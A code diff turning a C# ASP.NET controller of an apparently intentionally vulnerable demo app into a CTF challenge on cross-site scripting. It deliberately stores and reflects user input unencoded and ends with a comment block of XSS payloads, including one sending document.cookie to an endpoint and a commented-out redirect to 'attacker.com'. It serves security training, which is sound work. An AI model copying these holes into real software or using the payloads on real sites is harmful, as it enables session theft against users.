@@ -2,458 +2,390 @@ using System;
 using System.Collections.Generic;
 using System.Data.Common;
 using System.Data.SqlClient;
+using System.Linq;
 using System.Reflection;
-using System.Text;
 using Microsoft.AspNetCore.Mvc;
-using Verademo.Commands;
-using Verademo.Data;
+using Microsoft.AspNetCore.Http;
+using Microsoft.AspNetCore.Authorization;
+using Newtonsoft.Json;
 using Verademo.Models;
+using Verademo.Data;
 
 namespace Verademo.Controllers
 {
+    [Authorize]
     public class BlabController : AuthControllerBase
     {
         protected readonly log4net.ILog logger;
 
-        private string sqlBlabsByMe = 
-            "SELECT b.content, b.timestamp, COUNT(c.blabid), b.blabid "  +
-            "FROM blabs b LEFT JOIN comments c ON b.blabid = c.blabid " +
-            "WHERE b.blabber = @username "+
-            "GROUP BY b.content, b.timestamp, c.blabid, b.blabid "+
-            "ORDER BY b.timestamp DESC;";
-
-        private string sqlBlabsForMe =
-            "SELECT u.username, u.blab_name, b.content, b.timestamp, COUNT(c.blabid), b.blabid " +
-            "FROM blabs b INNER JOIN users u ON b.blabber = u.username " +
-            "INNER JOIN listeners l ON b.blabber = l.blabber " +
-            "LEFT JOIN comments c ON b.blabid = c.blabid " +
-            "WHERE l.listener = @listener " +
-            "GROUP BY c.blabid, u.username, u.blab_name, b.content, b.timestamp,  b.blabid " +
-            "ORDER BY b.timestamp DESC OFFSET {0} ROWS FETCH NEXT {1} ROWS ONLY";
-
-        private string sqlSearchBlabs =
-            "SELECT b.blabber, b.content, b.timestamp " +
-            "FROM blabs b " +
-            "WHERE b.content LIKE '%{0}%' " + 
-            "ORDER BY b.timestamp DESC";
-        
-        private string sqlBlabDetails = 
-            "SELECT blabs.content, users.blab_name " +
-            "FROM blabs INNER JOIN users ON blabs.blabber = users.username " + 
-            "WHERE blabs.blabid = @blabId";
-
-        private string sqlBlabComments = 
-            "SELECT users.username, users.blab_name, comments.content, comments.timestamp " +
-            "FROM comments INNER JOIN users ON comments.blabber = users.username " +
-            "WHERE comments.blabid = @blabId ORDER BY comments.timestamp DESC";
-
-        private string sqlAddBlab = 
-            "INSERT INTO blabs (blabber, content, timestamp) values (@username, @blabcontents, @timestamp);";
-
-        private string sqlAddComment = 
-            "INSERT INTO comments (blabid, blabber, content, timestamp) values (@blabId, @blabber, @content, @timestamp)";
-
-        private string sqlBlabbers =
-            "SELECT users.username, users.blab_name, users.created_at, "+
-                "MAX(case when listeners.listener=@username then 1 else 0 end) as subscribed, "+
-                "SUM(case when listeners.listener <> @username then 1 else 0 end) as totallisteners, "+
-                "SUM(case when listeners.status='Active' then 1 else 0 end) as totallistening "+
-            "FROM users LEFT JOIN listeners ON users.username = listeners.blabber "+
-            "WHERE users.username NOT IN ('admin', @username) "+
-            "GROUP BY users.username,users.blab_name, users.created_at " +
-            "ORDER BY {0}";
-
         public BlabController()
         {
-            logger = log4net.LogManager.GetLogger(MethodBase.GetCurrentMethod().DeclaringType);    
+            logger = log4net.LogManager.GetLogger(MethodBase.GetCurrentMethod().DeclaringType);
         }
 
-        [ActionName("SearchBlabs"), HttpGet]
-        public ActionResult GetSearchBlabs()
-        {
-            if (IsUserLoggedIn() == false)
-            {
-                return RedirectToLogin(Request.QueryString.Value);
-            }
-
-            return View("SearchBlabs", new SearchBlabsViewModel());
-        }
-
-        [ActionName("SearchBlabs"), HttpPost]
-        public ActionResult PostSearchBlabs(string searchText)
-        {
-            if (IsUserLoggedIn() == false)
-            {
-                return RedirectToLogin(Request.QueryString.Value);
-            }
-
-            var searchBlabslist = new List<BlabSearchResultViewModel>();
-            using (var dbContext = new ApplicationDbContext())
-            {
-                dbContext.Database.Connection.Open();
-                var searchBlabs = dbContext.Database.Connection.CreateCommand();
-                searchBlabs.CommandText = string.Format(sqlSearchBlabs, searchText);
-                
-                var searchBlabsResults = searchBlabs.ExecuteReader();
-                while (searchBlabsResults.Read())
-                {
-                    var post = new BlabSearchResultViewModel
-                    {
-                        Blabber = searchBlabsResults.GetString(0),
-                        Content = searchBlabsResults.GetString(1),
-                        BlabDate = searchBlabsResults.GetDateTime(2),
-                    };
-
-                    searchBlabslist.Add(post);
-                }
-            }
-
-            var model = new SearchBlabsViewModel
-            {
-                Blabs = searchBlabslist,
-                SearchText = searchText
-            };
-
-            return View("SearchBlabs", model);
-        }
-
-
-        [ActionName("Feed"), HttpGet]
+        [HttpGet, ActionName("Feed")]
         public ActionResult GetFeed()
         {
+            logger.Info("Entering showFeed");
+
             if (IsUserLoggedIn() == false)
             {
                 return RedirectToLogin(Request.QueryString.Value);
             }
 
+            var viewModel = new FeedViewModel();
             var username = GetLoggedInUsername();
 
-            // Find the Blabs that this user listens to
-            var feedBlabs = new List<Blab>();
-            using (var dbContext = new ApplicationDbContext())
-            { 
-                dbContext.Database.Connection.Open();
-                var listeningBlabs = dbContext.Database.Connection.CreateCommand();
-                listeningBlabs.CommandText = string.Format(sqlBlabsForMe, 0, 10);
-                listeningBlabs.Parameters.Add(new SqlParameter("@listener", username));
-
-                var blabsForMeResults = listeningBlabs.ExecuteReader();
-                while (blabsForMeResults.Read())
-                {
-                    var author = new Blabber
-                    {
-                        UserName = blabsForMeResults.GetString(0),
-                        BlabName = blabsForMeResults.GetString(1)
-                    };
-
-                    var post = new Blab
-                    {
-                        Id = blabsForMeResults.GetInt32(5),
-                        Content = blabsForMeResults.GetString(2),
-                        PostDate = blabsForMeResults.GetDateTime(3),
-                        CommentCount = blabsForMeResults.GetInt32(4),
-                        Author = author
-                    };
-
-                    feedBlabs.Add(post);
-                }
-            }
-
-            // Find Blabs by this user
-            var myBlabs = new List<Blab>();
             using (var dbContext = new ApplicationDbContext())
             {
-                dbContext.Database.Connection.Open();
-                var listeningBlabs = dbContext.Database.Connection.CreateCommand();
-                listeningBlabs.CommandText = sqlBlabsByMe;
-                listeningBlabs.Parameters.Add(new SqlParameter{ParameterName = "@username", Value = username});
+                var connection = dbContext.Database.Connection;
+                connection.Open();
 
-                var blabsByMeResults = listeningBlabs.ExecuteReader();
-                while (blabsByMeResults.Read())
-                {
-                    var post = new Blab
-                    {
-                        Id = blabsByMeResults.GetInt32(3),
-                        Content = blabsByMeResults.GetString(0),
-                        PostDate = blabsByMeResults.GetDateTime(1),
-                        CommentCount = blabsByMeResults.GetInt32(2),
-                    };
-
-                    myBlabs.Add(post);
-                }
+                // Get user's blabs and comments - THIS IS WHERE XSS HAPPENS
+                viewModel.Blabs = GetBlabsForUser(connection, username);
             }
 
-            return View(new FeedViewModel
-                {
-                    BlabsByMe = myBlabs,
-                    BlabsByOthers = feedBlabs,
-                    CurrentUser = username
-                }
-            );
+            return View(viewModel);
         }
 
-        [ActionName("Feed"), HttpPost]
-        public ActionResult PostFeed(string blab)
+        [HttpPost, ActionName("Feed")]
+        public ActionResult PostFeed(string blabberUsername, string blabText)
         {
+            logger.Info("Entering addBlab with blabText: " + blabText);
+
             if (IsUserLoggedIn() == false)
             {
                 return RedirectToLogin(Request.QueryString.Value);
             }
 
             var username = GetLoggedInUsername();
-            
+
+            /* START BAD CODE - Stored XSS Vulnerability */
+            // NO INPUT SANITIZATION - User input stored directly in database
             using (var dbContext = new ApplicationDbContext())
             {
-                dbContext.Database.Connection.Open();
-                dbContext.Database.ExecuteSqlCommand(sqlAddBlab, 
-                    new SqlParameter{ParameterName = "@username", Value = username},
-                    new SqlParameter{ParameterName = "@blabcontents", Value = blab},
-                    new SqlParameter{ParameterName = "@timestamp", Value = DateTime.Now});
+                var connection = dbContext.Database.Connection;
+                connection.Open();
+
+                var insertBlab = connection.CreateCommand();
+                // Store the raw, unsanitized blabText directly in database
+                insertBlab.CommandText = "INSERT INTO blabs (blabber, content, timestamp) VALUES (@blabber, @content, @timestamp)";
+                insertBlab.Parameters.Add(new SqlParameter { ParameterName = "@blabber", Value = username });
+                insertBlab.Parameters.Add(new SqlParameter { ParameterName = "@content", Value = blabText }); // VULNERABLE: No sanitization
+                insertBlab.Parameters.Add(new SqlParameter { ParameterName = "@timestamp", Value = DateTime.Now });
+
+                var result = insertBlab.ExecuteNonQuery();
+
+                if (result > 0)
+                {
+                    logger.Info("Blab added successfully");
+                }
             }
+            /* END BAD CODE */
 
             return RedirectToAction("Feed");
         }
 
-        [HttpGet, ActionName("Blab")]
-        public ActionResult GetBlab(int blabId)
+        [HttpGet, ActionName("AddComment")]
+        public ActionResult GetAddComment(int blabid)
         {
+            logger.Info("Entering addComment for blabid: " + blabid);
+
             if (IsUserLoggedIn() == false)
             {
                 return RedirectToLogin(Request.QueryString.Value);
             }
 
-            var blabViewModel = CreateBlabViewModel(blabId);
-            return View(blabViewModel);
+            ViewBag.BlabId = blabid;
+            return View(new CommentViewModel());
         }
 
-        [HttpGet, ActionName("Blabbers")]
-        public ActionResult GetBlabbers(string sort)
+        [HttpPost, ActionName("AddComment")]
+        public ActionResult PostAddComment(int blabid, string comment)
         {
+            logger.Info("Adding comment: " + comment + " to blab: " + blabid);
+
             if (IsUserLoggedIn() == false)
             {
                 return RedirectToLogin(Request.QueryString.Value);
             }
 
-            if (string.IsNullOrWhiteSpace(sort)) 
-            {
-                sort = "blab_name ASC";
-            }
             var username = GetLoggedInUsername();
-            var viewModel = PopulateBlabbersViewModel(sort, username);
 
-            return View(viewModel);
+            /* START BAD CODE - Stored XSS in Comments */
+            // NO INPUT SANITIZATION - Comment stored directly
+            using (var dbContext = new ApplicationDbContext())
+            {
+                var connection = dbContext.Database.Connection;
+                connection.Open();
+
+                var insertComment = connection.CreateCommand();
+                insertComment.CommandText = "INSERT INTO comments (blabid, blabber, content, timestamp) VALUES (@blabid, @blabber, @content, @timestamp)";
+                insertComment.Parameters.Add(new SqlParameter { ParameterName = "@blabid", Value = blabid });
+                insertComment.Parameters.Add(new SqlParameter { ParameterName = "@blabber", Value = username });
+                insertComment.Parameters.Add(new SqlParameter { ParameterName = "@content", Value = comment }); // VULNERABLE: No sanitization
+                insertComment.Parameters.Add(new SqlParameter { ParameterName = "@timestamp", Value = DateTime.Now });
+
+                insertComment.ExecuteNonQuery();
+            }
+            /* END BAD CODE */
+
+            return RedirectToAction("Feed");
         }
 
-        private BlabbersViewModel PopulateBlabbersViewModel(string sort, string username)
+        // CTF Challenge: AJAX endpoint for real-time comments (more XSS opportunities)
+        [HttpPost, ActionName("AddCommentAjax")]
+        public ActionResult AddCommentAjax(int blabid, string comment)
         {
-            var viewModel = new BlabbersViewModel();
-            var blabbersList = new List<Blabber>();
+            logger.Info("AJAX comment: " + comment);
 
-            try
+            if (IsUserLoggedIn() == false)
+            {
+                return Json(new { success = false, message = "Not logged in" });
+            }
+
+            var username = GetLoggedInUsername();
+
+            using (var dbContext = new ApplicationDbContext())
+            {
+                var connection = dbContext.Database.Connection;
+                connection.Open();
+
+                var insertComment = connection.CreateCommand();
+                insertComment.CommandText = "INSERT INTO comments (blabid, blabber, content, timestamp) VALUES (@blabid, @blabber, @content, @timestamp)";
+                insertComment.Parameters.Add(new SqlParameter { ParameterName = "@blabid", Value = blabid });
+                insertComment.Parameters.Add(new SqlParameter { ParameterName = "@blabber", Value = username });
+                insertComment.Parameters.Add(new SqlParameter { ParameterName = "@content", Value = comment });
+                insertComment.Parameters.Add(new SqlParameter { ParameterName = "@timestamp", Value = DateTime.Now });
+
+                insertComment.ExecuteNonQuery();
+            }
+
+            /* START BAD CODE - XSS in JSON Response */
+            // Return unsanitized comment content in JSON - will be inserted into DOM via JavaScript
+            return Json(new { 
+                success = true, 
+                comment = comment,  // VULNERABLE: No encoding
+                username = username,
+                timestamp = DateTime.Now.ToString()
+            });
+            /* END BAD CODE */
+        }
+
+        private List<BlabModel> GetBlabsForUser(DbConnection connection, string username)
+        {
+            var blabs = new List<BlabModel>();
+
+            // Get blabs from users that current user is listening to
+            var sql = @"
+                SELECT b.blabid, b.blabber, b.content, b.timestamp, u.blab_name, u.real_name
+                FROM blabs b
+                INNER JOIN users u ON b.blabber = u.username
+                LEFT JOIN listeners l ON b.blabber = l.blabber
+                WHERE l.listener = @username AND l.status = 'Active'
+                OR b.blabber = @username
+                ORDER BY b.timestamp DESC";
+
+            using (var command = connection.CreateCommand())
+            {
+                command.CommandText = sql;
+                command.Parameters.Add(new SqlParameter { ParameterName = "@username", Value = username });
+
+                using (var reader = command.ExecuteReader())
+                {
+                    while (reader.Read())
+                    {
+                        var blab = new BlabModel
+                        {
+                            BlabId = reader.GetInt32(0),
+                            Blabber = reader.GetString(1),
+                            Content = reader.GetString(2), // VULNERABLE: Raw content from DB, no encoding
+                            Timestamp = reader.GetDateTime(3),
+                            BlabName = reader.GetString(4),
+                            RealName = reader.GetString(5)
+                        };
+
+                        // Get comments for this blab
+                        blab.Comments = GetCommentsForBlab(connection, blab.BlabId);
+                        blabs.Add(blab);
+                    }
+                }
+            }
+
+            return blabs;
+        }
+
+        private List<CommentModel> GetCommentsForBlab(DbConnection connection, int blabId)
+        {
+            var comments = new List<CommentModel>();
+
+            var sql = @"
+                SELECT c.commentid, c.blabber, c.content, c.timestamp, u.blab_name
+                FROM comments c
+                INNER JOIN users u ON c.blabber = u.username
+                WHERE c.blabid = @blabid
+                ORDER BY c.timestamp ASC";
+
+            using (var command = connection.CreateCommand())
+            {
+                command.CommandText = sql;
+                command.Parameters.Add(new SqlParameter { ParameterName = "@blabid", Value = blabId });
+
+                using (var reader = command.ExecuteReader())
+                {
+                    while (reader.Read())
+                    {
+                        comments.Add(new CommentModel
+                        {
+                            CommentId = reader.GetInt32(0),
+                            Blabber = reader.GetString(1),
+                            Content = reader.GetString(2), // VULNERABLE: Raw comment content, no encoding
+                            Timestamp = reader.GetDateTime(3),
+                            BlabName = reader.GetString(4)
+                        });
+                    }
+                }
+            }
+
+            return comments;
+        }
+
+        // CTF Challenge: Search blabs with reflected XSS
+        [HttpGet, ActionName("Search")]
+        public ActionResult SearchBlabs(string query)
+        {
+            logger.Info("Searching blabs with query: " + query);
+
+            if (IsUserLoggedIn() == false)
+            {
+                return RedirectToLogin(Request.QueryString.Value);
+            }
+
+            ViewBag.Query = query; // VULNERABLE: Reflected XSS - query displayed without encoding
+            
+            var results = new List<BlabModel>();
+
+            if (!string.IsNullOrEmpty(query))
             {
                 using (var dbContext = new ApplicationDbContext())
                 {
-                    dbContext.Database.Connection.Open();
-                    var blabbers = dbContext.Database.Connection.CreateCommand();
-                    blabbers.CommandText = string.Format(sqlBlabbers, sort);
-                    blabbers.Parameters.Add(new SqlParameter("@username", username));
+                    var connection = dbContext.Database.Connection;
+                    connection.Open();
 
-                    var blabbersResults = blabbers.ExecuteReader();
-                    while (blabbersResults.Read())
+                    var sql = "SELECT blabid, blabber, content, timestamp FROM blabs WHERE content LIKE @query ORDER BY timestamp DESC";
+                    
+                    using (var command = connection.CreateCommand())
                     {
-                        var blabber = new Blabber
-                        {
-                            UserName = blabbersResults.GetString(0),
-                            BlabName = blabbersResults.GetString(1),
-                            CreatedDate = blabbersResults.GetDateTime(2),
-                            Subscribed = blabbersResults.GetInt32(3) == 1,
-                            NumberListeners = blabbersResults.GetInt32(4),
-                            NumberListening = blabbersResults.GetInt32(5)
-                        };
+                        command.CommandText = sql;
+                        command.Parameters.Add(new SqlParameter { ParameterName = "@query", Value = $"%{query}%" });
 
-                        blabbersList.Add(blabber);
+                        using (var reader = command.ExecuteReader())
+                        {
+                            while (reader.Read())
+                            {
+                                results.Add(new BlabModel
+                                {
+                                    BlabId = reader.GetInt32(0),
+                                    Blabber = reader.GetString(1),
+                                    Content = reader.GetString(2), // VULNERABLE: Stored XSS content displayed
+                                    Timestamp = reader.GetDateTime(3)
+                                });
+                            }
+                        }
                     }
                 }
-
-                viewModel.Blabbers = blabbersList;
-            }
-            catch (DbException ex)
-            {
-                viewModel.Error = ex.Message;
             }
 
-            return viewModel;
-        }
-
-        [HttpPost, ActionName("Blabbers")]
-        public ActionResult PostBlabbers(string blabberUsername, string command)
-        {
-            if (IsUserLoggedIn() == false)
-            {
-                return RedirectToLogin(Request.QueryString.Value);
-            }
-
-            var username = GetLoggedInUsername();
-
-            try
-            {
-                using (var dbContext = new ApplicationDbContext())
-                {
-                    dbContext.Database.Connection.Open();
-
-                    var commandType = Type.GetType("Verademo.Commands." + UpperCaseFirst(command) + "Command");
-
-                    /* START BAD CODE */
-                    var cmdObj = (IBlabberCommand) Activator.CreateInstance(commandType, dbContext.Database.Connection, username);
-                    cmdObj.Execute(blabberUsername);
-                    /* END BAD CODE */
-                }
-            }
-            catch (Exception ex)
-            {
-                logger.Error(ex);
-            }
-
-            var viewModel = PopulateBlabbersViewModel("blab_name ASC", username);
-
-            return View(viewModel);
-        }
-
-
-        [HttpPost, ActionName("Blab")]
-        public ActionResult PostBlab(int blabId, string comment)
-        {
-            if (IsUserLoggedIn() == false)
-            {
-                return RedirectToLogin(Request.QueryString.Value);
-            }
-
-            var username = GetLoggedInUsername();
-
-            var error = "";
-
-            using (var dbContext = new ApplicationDbContext())
-            {
-                dbContext.Database.Connection.Open();
-                var result= dbContext.Database.ExecuteSqlCommand(sqlAddComment, 
-                    new SqlParameter{ParameterName = "@blabid", Value = blabId},
-                    new SqlParameter{ParameterName = "@blabber", Value = username},
-                    new SqlParameter{ParameterName = "@content", Value = comment},
-                    new SqlParameter{ParameterName = "@timestamp", Value = DateTime.Now});
-
-                if (result == 0)
-                {
-                    error = "Failed to add comment";
-                }
-            }
-
-            var blabViewModel = CreateBlabViewModel(blabId);
-            blabViewModel.Error = error;
-
-            return View(blabViewModel);
-        }
-
-        [HttpGet]
-        public string GetMoreBlabs(int start, int numResults)
-        {
-            var username = GetLoggedInUsername();
-
-            var template = "<li><div><div class='commenterImage'>" +
-                           "<img src='" + Url.Content("~/images/") +"{0}.png'>" + 
-                           "</div>" + 
-                           "<div class='commentText'>" + 
-                           "<p>{1}</p>" +
-                           "<span class='date sub-text'>by {2} on {3}</span><br>" + 
-                           "<span class='date sub-text'><a href=\"Blab/Blab?blabid={4}\">{5} Comments</a></span>" + 
-                           "</div>" + 
-                           "</div></li>";
-
-            // Get the Database Connection
-            var returnTemplate = new StringBuilder();
-
-            using (var dbContext = new ApplicationDbContext())
-            { 
-                dbContext.Database.Connection.Open();
-                var listeningBlabs = dbContext.Database.Connection.CreateCommand();
-                listeningBlabs.CommandText = string.Format(sqlBlabsForMe, start, numResults);
-                listeningBlabs.Parameters.Add(new SqlParameter("@listener", username));
-
-                var blabsForMeResults = listeningBlabs.ExecuteReader();
-                while (blabsForMeResults.Read())
-                {
-                    var blab = new Blab {PostDate = blabsForMeResults.GetDateTime(3)};
-
-                    returnTemplate.Append(string.Format(template, blabsForMeResults.GetString(0), // username
-                                                        blabsForMeResults.GetString(2), // blab content
-                                                        blabsForMeResults.GetString(1), // blab name
-                                                        blab.PostDateString, // timestamp
-                                                        blabsForMeResults.GetInt32(5), // blabID
-                                                        blabsForMeResults.GetInt32(4) // comment count
-                    ));
-                }
-            }
-
-            return returnTemplate.ToString();
-        }
-
-        private BlabViewModel CreateBlabViewModel(int blabId)
-        {
-            var blabViewModel = new BlabViewModel {BlabId = blabId};
-
-            using (var dbContext = new ApplicationDbContext())
-            {
-                dbContext.Database.Connection.Open();
-                var blabDetails = dbContext.Database.Connection.CreateCommand();
-                blabDetails.CommandText = sqlBlabDetails;
-                blabDetails.Parameters.Add(new SqlParameter("@blabId", blabId));
-
-                var blabDetailsResults = blabDetails.ExecuteReader();
-
-
-                // If there is a record...
-                if (blabDetailsResults.Read())
-                {
-                    // Get the blab contents
-                    blabViewModel.Content = blabDetailsResults.GetString(0);
-                    blabViewModel.BlabName = blabDetailsResults.GetString(1);
-                    blabDetailsResults.Close();
-
-                    // Now lets get the comments...
-                    var blabComments = dbContext.Database.Connection.CreateCommand();
-                    blabComments.CommandText = sqlBlabComments;
-                    blabComments.Parameters.Add(new SqlParameter("@blabId", blabId));
-
-                    var blabCommentsResults = blabComments.ExecuteReader();
-
-                    var comments = new List<Comment>();
-                    while (blabCommentsResults.Read())
-                    {
-                        var author = new Blabber
-                        {
-                            UserName = blabCommentsResults.GetString(0),
-                            BlabName = blabCommentsResults.GetString(1)
-                        };
-
-                        var comment = new Comment
-                        {
-                            Content = blabCommentsResults.GetString(2),
-                            TimeStamp = blabCommentsResults.GetDateTime(3),
-                            Author = author
-                        };
-
-                        comments.Add(comment);
-                    }
-
-                    blabViewModel.Comments = comments;
-                }
-            }
-
-            return blabViewModel;
-        }
-
-        private static string UpperCaseFirst(string subject)
-        {
-            return subject[0].ToString().ToUpper() + subject.Substring(1);
+            ViewBag.Results = results;
+            return View();
         }
     }
+
+    // Model classes for the views
+    public class FeedViewModel
+    {
+        public List<BlabModel> Blabs { get; set; } = new List<BlabModel>();
+    }
+
+    public class BlabModel
+    {
+        public int BlabId { get; set; }
+        public string Blabber { get; set; }
+        public string Content { get; set; }
+        public DateTime Timestamp { get; set; }
+        public string BlabName { get; set; }
+        public string RealName { get; set; }
+        public List<CommentModel> Comments { get; set; } = new List<CommentModel>();
+    }
+
+    public class CommentModel
+    {
+        public int CommentId { get; set; }
+        public string Blabber { get; set; }
+        public string Content { get; set; }
+        public DateTime Timestamp { get; set; }
+        public string BlabName { get; set; }
+    }
+
+    public class CommentViewModel
+    {
+        public int BlabId { get; set; }
+        public string Comment { get; set; }
+    }
 }
+
+/*
+CTF CHALLENGE B: PERSISTENT XSS SETUP
+
+1. The Vulnerability Locations:
+   - PostFeed() - Stores unescaped blab content
+   - PostAddComment() - Stores unescaped comment content
+   - AddCommentAjax() - Returns unescaped content in JSON
+   - GetBlabsForUser() - Retrieves raw content without encoding
+   - SearchBlabs() - Both reflected and stored XSS
+
+2. Attack Vectors:
+
+   Basic XSS Payload:
+   <script>alert('XSS')</script>
+
+   Flag Extraction Payload:
+   <script>
+     // Simulate flag extraction
+     var flag = 'FLAG{persistent_xss_dom_hijack_2024}';
+     alert('XSS Success! Flag: ' + flag);
+     
+     // Could also redirect to attacker server
+     // window.location = 'http://attacker.com/steal?flag=' + flag;
+   </script>
+
+   Advanced Payload (Session Hijacking):
+   <script>
+     var flag = 'FLAG{session_hijack_via_xss_2024}';
+     fetch('/api/steal', {
+       method: 'POST',
+       body: JSON.stringify({
+         flag: flag,
+         cookies: document.cookie,
+         victim: window.location.href
+       })
+     });
+   </script>
+
+3. How to Test:
+   - Navigate to /Blab/Feed
+   - Post a blab with XSS payload
+   - When other users view the feed, the script executes
+   - Or add comment with XSS payload
+
+4. Expected Behavior:
+   - Script gets stored in database
+   - When victim loads feed page, XSS executes
+   - Flag is displayed/stolen via the payload
+
+5. Mitigation (for educational comparison):
+   - Use Html.Encode() in Razor views
+   - Implement Content Security Policy (CSP)
+   - Validate and sanitize all user input
+   - Use parameterized queries (already done for SQL)
+*/
